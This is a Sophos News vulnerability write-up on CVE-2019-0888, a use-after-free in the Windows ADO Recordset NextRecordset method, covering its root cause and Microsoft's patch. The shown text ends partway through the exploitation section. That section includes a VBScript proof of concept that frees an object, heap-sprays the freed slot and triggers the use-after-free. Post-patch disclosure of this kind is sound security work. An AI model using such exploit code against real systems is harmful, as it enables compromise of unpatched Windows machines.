<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO) &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO) Comments Feed" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1615321555' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpqWkWAK9EIho='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/57686" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" />
<link rel='shortlink' href='https://news.sophos.com/?p=57686' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2019%2F07%2F09%2Fcve-2019-0888-use-after-free-in-windows-activex-data-objects-ado%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2019%2F07%2F09%2Fcve-2019-0888-use-after-free-in-windows-activex-data-objects-ado%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)" />
<meta property="og:url" content="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" />
<meta property="og:description" content="Details of the vulnerability we reported to Microsoft and was fixed in last month&#8217;s Patch Tuesday" />
<meta property="article:published_time" content="2019-07-09T14:00:58+00:00" />
<meta property="article:modified_time" content="2019-07-10T02:15:15+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=170" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=170" />
<meta property="og:image:width" content="636" />
<meta property="og:image:height" content="576" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=144" />
<meta name="twitter:card" content="summary" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-57686 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-57686" class="post-57686 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-ado tag-cve-2019-0888 tag-exploit tag-use-after-free tag-vbscript tag-vulnerability tag-windows region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>&bull;<a href="https://news.sophos.com/en-us/tag/ado/">ADO</a>&bull;<a href="https://news.sophos.com/en-us/tag/cve-2019-0888/">CVE-2019-0888</a>&bull;<a href="https://news.sophos.com/en-us/tag/exploit/">Exploit</a>&bull;<a href="https://news.sophos.com/en-us/tag/use-after-free/">use-after-free</a>&bull;<a href="https://news.sophos.com/en-us/tag/vbscript/">VBscript</a>&bull;<a href="https://news.sophos.com/en-us/tag/vulnerability/">vulnerability</a>&bull;<a href="https://news.sophos.com/en-us/tag/windows/">Windows</a>		</div>

					<div class="entry-excerpt">
				<p>Details of the vulnerability we reported to Microsoft and was fixed in last month&#8217;s Patch Tuesday</p>
			</div>
		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" rel="bookmark">9 July 2019</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				0			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=CVE-2019-0888%3A%20Use-After-Free%20in%20Windows%20ActiveX%20Data%20Objects%20%28ADO%29%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D57686" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=57686&#038;title=CVE-2019-0888:%20Use-After-Free%20in%20Windows%20ActiveX%20Data%20Objects%20(ADO)" data-title="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/"
				data-title="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="170" height="171" src="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=170" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg 170w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=150,150 150w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=32,32 32w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=50,50 50w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=64,64 64w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=96,96 96w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=128,128 128w" sizes="(max-width: 170px) 100vw, 170px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/7u7bdp6d/" title="Posts by SophosLabs Offensive Security" class="author url fn" rel="author">SophosLabs Offensive Security</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		
<p>The SophosLabs Offensive Security Research team discovered a security vulnerability in the <a href="https://docs.microsoft.com/en-us/sql/ado/microsoft-activex-data-objects-ado?view=sql-server-2017">ActiveX Data Objects (ADO)</a> component of Windows. Microsoft resolved the issue in the <a href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/">June 2019 edition of Patch Tuesday</a>. It has been a month since the patch was released, so we&#8217;ve decided to publish the following explanation of the bug, and how to exploit it to achieve an ASLR bypass and Read/Write primitive.</p>
<p>The article references symbols and types from the 32-bit <strong>vbscript.dll</strong> file, version 5.812.10240.16384, from Windows 10.</p>



<h2>Background</h2>



<p>ADO is an API to access and manipulate data through an OLE database provider. In our examples to follow, the OLE DB provider is a Microsoft SQL server. Different programs, using a variety of languages, can use this API.</p>
<p>In the scope of this article, we will make use of ADO from VBScript code running in Internet Explorer, and connect to a <a href="https://www.microsoft.com/en-ca/download/details.aspx?id=42299">Microsoft SQL Server 2014 Express</a> instance running locally.</p>

<h6 id="usage-poc"> </h6>

<p>Here&#8217;s an example of a basic VBScript script that establishes a connection to the local database (named <em>SQLEXPRESS</em>) by using an <a href="https://docs.microsoft.com/en-us/sql/ado/reference/ado-api/recordset-object-ado?view=sql-server-2017">ADO Recordset object</a>:</p>


<pre class="brush: vb; title: ; notranslate" title="">
On Error Resume Next

Set RS = CreateObject(&quot;ADOR.Recordset&quot;)

RS.Open &quot;SELECT * FROM INFORMATION_SCHEMA.COLUMNS&quot;, _
                &quot;Provider=SQLOLEDB;&quot; &amp;amp; _
                &quot;Data Source=.\SQLEXPRESS;&quot; &amp;amp; _
                &quot;Initial Catalog=master;&quot; &amp;amp; _
                &quot;Integrated Security=SSPI;&quot; &amp;amp; _
                &quot;Trusted_Connection=True;&quot;

If Err.Number &lt;&amp;gt; 0 Then
        MsgBox(&quot;DB open error&quot;)
Else
        MsgBox(&quot;DB opened&quot;)
End If
</pre>


<p>Establishing a connection using ADO from Internet Explorer prompts this security warning, which makes the bug inconvenient to exploit unobtrusively.</p>



<div class="wp-block-image">
<figure class="aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png"><img loading="lazy" width="495" height="181" class="wp-image-57693" src="https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png" alt="" srcset="https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png 495w, https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png?resize=300,110 300w" sizes="(max-width: 495px) 100vw, 495px" /></a></figure>
<p>&nbsp;</p>
</div>
<p><span id="more-57686"></span></p>



<h2>The Bug</h2>



<p>The <code>Recordset</code> Object method <code>NextRecordset</code> improperly handles its <code>RecordsAffected</code> parameter.</p>
<p>When an application calls this method with an Object-typed variable passed to it as the <code>RecordsAffected</code> parameter, the method will leave that object&#8217;s reference count decreased by 1, while keeping the variable referenceable.</p>
<p>When the reference count drops to 0, the operating system destroys the object and deallocates its memory. However, since the object can still be referenced by its variable name, further usage of that variable will cause a <strong>Use-After-Free</strong> condition.</p>



<p>These are the important bits about <code>NextRecordset</code>&#8216;s functionality from <a href="https://docs.microsoft.com/en-us/sql/ado/reference/ado-api/nextrecordset-method-ado?view=sql-server-2017">its documentation</a>:</p>



<ul>
<li style="list-style-type:none;">
<ul>
<li><em>Use the NextRecordset method to return the results of the next command in a compound command statement or of a stored procedure that returns multiple results.</em></li>
<li><em>The NextRecordset method is not available on a disconnected Recordset object.</em></li>
<li><em>Parameters: RecordsAffected<br />Optional. A Long variable to which the provider returns the number of records that the current operation affected.</em></li>
</ul>
</li>
</ul>



<p>Simply put, the method works on a connected Recordset object, retrieves and returns some sort of database related data, and writes back a number to the provided parameter.</p>



<h6 id="com-interface"> </h6>

<p>The method is implemented in library <code>msado15.dll</code> with the function <code>CRecordset::NextRecordset</code>. This is how <code>NextRecordset</code> is defined in the library&#8217;s <a href="https://docs.microsoft.com/en-us/windows/desktop/com/defining-com-interfaces">COM interface</a>:</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png"><img loading="lazy" class="alignnone wp-image-58429 size-full" src="https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png" alt="" width="581" height="143" srcset="https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png 581w, https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png?resize=300,74 300w" sizes="(max-width: 581px) 100vw, 581px" /></a></p>



<p>If the method is successful at retrieving the database-related data, it calls the internal function <code>ProcessRecordsAffected</code> to handle the assignment of the number of affected records to parameter <code>RecordsAffected</code>.</p>



<p>Inside <code>ProcessRecordsAffected</code>, the library creates a local variable, called <code>local_copy_of_RecordsAffected</code> , <a href="https://en.wikipedia.org/wiki/Object_copying#Shallow_copy" target="_blank" rel="noopener">shallow-copies</a> the <code>RecordsAffected</code> parameter into it, and then calls the <code>VariantClear</code> function:</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png"><img loading="lazy" class="alignnone size-full wp-image-58433" src="https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png" alt="" width="638" height="255" srcset="https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png 638w, https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png?resize=300,120 300w" sizes="(max-width: 638px) 100vw, 638px" /></a></p>



<p><code>VariantClear</code> is described <a href="https://docs.microsoft.com/en-us/windows/desktop/api/oleauto/nf-oleauto-variantclear">here</a>. To quote:</p>
<p style="padding-left:40px;">&#8220;<em>The function clears a VARIANTARG by setting the vt field to VT_EMPTY.</em>&#8220;<br />&#8220;<em>The current contents of the VARIANTARG are released first. [&#8230;] If the vt field is VT_DISPATCH, the object is released</em>.&#8221;</p>



<p>VBScript object variables are, essentially, wrapped ActiveX objects, implemented in C++. They are created by the function <a href="https://www.w3schools.com/asp/func_createobject.asp">CreateObject</a>, e.g. variable <code>RS</code> in the <a href="#usage-poc">above code sample</a>.</p>
<p>VBScript objects are represented internally as <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/variant-data-type">Variant</a> structures of the type VT_DISPATCH. Therefore, in this case, the call to <code>VariantClear</code> will set <code>local_copy_of_RecordsAffected</code>&#8216;s type to VT_EMPTY, and perform a &#8220;release&#8221; on it, meaning it will invoke its underlying C++ object&#8217;s <a href="https://docs.microsoft.com/en-us/windows/desktop/api/unknwn/nf-unknwn-iunknown-release">::Release</a> method, which decrements the object&#8217;s reference count by 1 (and destroys the object if the reference count reaches 0).</p>



<p>After the <code>VariantClear</code> call, the function continues as follows:</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/vct.png"><img loading="lazy" class="alignnone size-full wp-image-58434" src="https://news.sophos.com/wp-content/uploads/2019/05/vct.png" alt="" width="640" height="344" srcset="https://news.sophos.com/wp-content/uploads/2019/05/vct.png 640w, https://news.sophos.com/wp-content/uploads/2019/05/vct.png?resize=300,161 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>



<p>This function converts the 64-bit integer variable, <code>RecordsAffectedNum,</code>  into a signed 32-bit integer (referred to here as <em>type VT_I4</em>), and passes that value to <a href="https://docs.microsoft.com/en-us/windows/desktop/api/oleauto/nf-oleauto-variantchangetype">VariantChangeType</a> in an attempt to convert it to a variant of type <code>RecordsAffected_vt</code>, which is VT_DISPATCH in the vulnerable scenario.</p>
<p>No logic exists to convert a VT_I4 type into a VT_DISPATCH type, so <code>VariantChangeType</code> will always fail here, and the early return path will take place. Since <code>RecordsAffected</code> is defined with the <em><a href="https://docs.microsoft.com/en-us/windows/desktop/Midl/out-idl">out</a> </em>attribute in its <a href="#com-interface">COM interface declaration</a>, the way <code>ProcessRecordsAffected</code> handles <code>RecordsAffected</code> will have an impact on the program:</p>



<p style="padding-left:40px;">&#8220;<em>The [<strong>out</strong>] attribute indicates that a parameter that acts as a pointer and its associated data in memory are to be passed back from the called procedure to the calling procedure.</em>&#8220;</p>
<p>Simply put, <code>RecordsAffected</code> is passed back to the program after <code>NextRecordset</code> returns, either in its original state or whatever state it was modified into by <code>ProcessRecordsAffected</code>. Looking back at the execution path the function undergoes in a vulnerable scenario, we can see it reaches the return statement without ever directly modifying <code>RecordsAffected</code>.</p>
<p><code>VariantClear</code> is called on <strong>a copy</strong> of <code>RecordsAffected</code>, so it triggers a release of the copy&#8217;s underlying C++ object, and changes the copy&#8217;s type to VT_EMPTY.</p>
<p>Since the copying was done in a <em>shallow</em> way, both <code>RecordsAffected</code> and its copy contain the same pointer to the underlying C++ object; A release of one of the variables is equivalent to a release of the second. However, changing the copy&#8217;s type to VT_EMPTY will have no effect on <code>RecordsAffected</code> &#8211; its type will remain intact.</p>
<p>Since <code>RecordsAffected</code>&#8216;s type has not been emptied, it will be passed back to the program and remain referenceable, despite its underlying C++ object being released and, potentially, deallocated.</p>
<p>Considering how the bug is seemingly triggered on every call to the method, how does it manage to complete a legitimate call without crashing?</p>
<p>Looking back at the documentation, it specifies that <code>RecordsAffected</code> is supposed to be of type <em>Long</em> (a variant of type VT_I4). <code>VariantClear</code> does not have the same destructive effect on VT_I4 variants as it does on VT_DISPATCH variants (releasing its object). Therefore, as long as calls to the method use a <code>RecordsAffected</code> that fits the intended type, there will be no negative side effects to the program.</p>







<h2>Fix</h2>



<p>The bug was fixed in Microsoft&#8217;s <a href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/">June 2019 edition of Patch Tuesday</a>, and was assigned <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0888">CVE-2019-0888</a>.</p>



<p>The function <code>ProcessRecordsAffected</code> was patched to omit the local variable <code>local_copy_of_RecordsAffected</code>, instead operating directly on <code>RecordsAffected</code>, correctly emptying its type and preventing it from being passed back to the program.</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png"><img loading="lazy" class="alignnone size-full wp-image-58436" src="https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png" alt="" width="637" height="182" srcset="https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png 637w, https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png?resize=300,86 300w" sizes="(max-width: 637px) 100vw, 637px" /></a></p>



<h2>&#8220;Dumb&#8221; Exploitation</h2>



<p>The simplest way to achieve some type of exploit primitive with this bug would be to cause an object to be freed, and then immediately spray the heap with controlled-data memory allocations of the same size as the freed object, so that the memory that used to hold the object now holds our own arbitrary data.</p>


<pre class="brush: vb; title: ; notranslate" title="">
On Error Resume Next

Set RS = CreateObject(&quot;ADOR.Recordset&quot;)
Set freed_object = CreateObject(&quot;ADOR.Recordset&quot;)

' Open Recordset connection to database
RS.Open &quot;SELECT * FROM INFORMATION_SCHEMA.COLUMNS&quot;, _
                &quot;Provider=SQLOLEDB;&quot; &amp;amp; _
                &quot;Data Source=.\SQLEXPRESS;&quot; &amp;amp; _
                &quot;Initial Catalog=master;&quot; &amp;amp; _
                &quot;Integrated Security=SSPI;&quot; &amp;amp; _
                &quot;Trusted_Connection=True;&quot;

' Connection objects to be used for heap spray later
Dim array(1000)
For i = 0 To 1000
        Set array(i) = CreateObject(&quot;ADODB.Connection&quot;)
Next

' Data to spray in heap: allocation size will be 0x418
' (size of CRecordset in 32-bit msado15.dll)
spray = ChrW(&amp;amp;h4141) &amp;amp; ChrW(&amp;amp;h4141) &amp;amp; _
        ChrW(&amp;amp;h4141) &amp;amp; ChrW(&amp;amp;h4141) &amp;amp; _
        Space(519)

' Trigger bug
Set Var1 = RS.NextRecordset(freed_object)

' Perform heap spray
For i = 0 To 1000
        array(i).ConnectionString = spray
Next

' Trigger use after free
freed_object.Clone()
</pre>


<p>Line 4 creates a new VBScript object <code>freed_object</code>, with an underlying C++ object of type <code>CRecordset</code>, a 0x418-byte-sized structure.</p>



<p>Line 27 decreases <code>freed_object</code>&#8216;s underlying C++ object&#8217;s reference count to 0, and should cause the deallocation of its internal resources.</p>



<p>Line 31 uses the <code>ConnectionString</code> property of the <code>ADODB.Connection</code> class to spray the heap. When a string is assigned into <code>ConnectionString</code> it creates a local copy, allocating a memory chunk with the same size as the assigned string, and copying its contents into it. The <code>spray</code> string is crafted to result in a 0x418-byte allocation.</p>



